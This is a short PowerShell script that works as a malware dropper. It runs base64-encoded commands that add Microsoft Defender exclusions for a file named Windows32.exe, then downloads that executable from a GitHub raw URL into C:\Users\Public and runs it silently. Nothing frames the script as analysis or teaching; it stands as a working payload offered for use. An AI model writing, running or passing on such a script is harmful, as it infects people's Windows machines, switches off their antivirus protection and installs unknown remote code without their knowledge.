powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAQwA6AFwAVQBzAGUAcgBzAFwAUAB1AGIAbABpAGMAXABXAGkAbgBkAG8AdwBzADMAMgAuAGUAeABlACIAIAAtAEYAbwByAGMAZQA=
powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAQQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwAWABlAG4AbwBNAGEAbgBhAGcAZQByAFwAVwBpAG4AZABvAHcAcwAzADIALgBlAHgAZQAiACAALQBGAG8AcgBjAGUAIgAgAC0ARgBvAHIAYwBlAA==
Invoke-WebRequest -Uri 'https://github.com/Ilyaskand/e/raw/refs/heads/main/Windows32.exe' -OutFile 'C:\\Users\\Public\\Windows32.exe'
Start-Process 'C:\\Users\\Public\\Windows32.exe' -ArgumentList '/silent' -NoNewWindow -Wait
exit
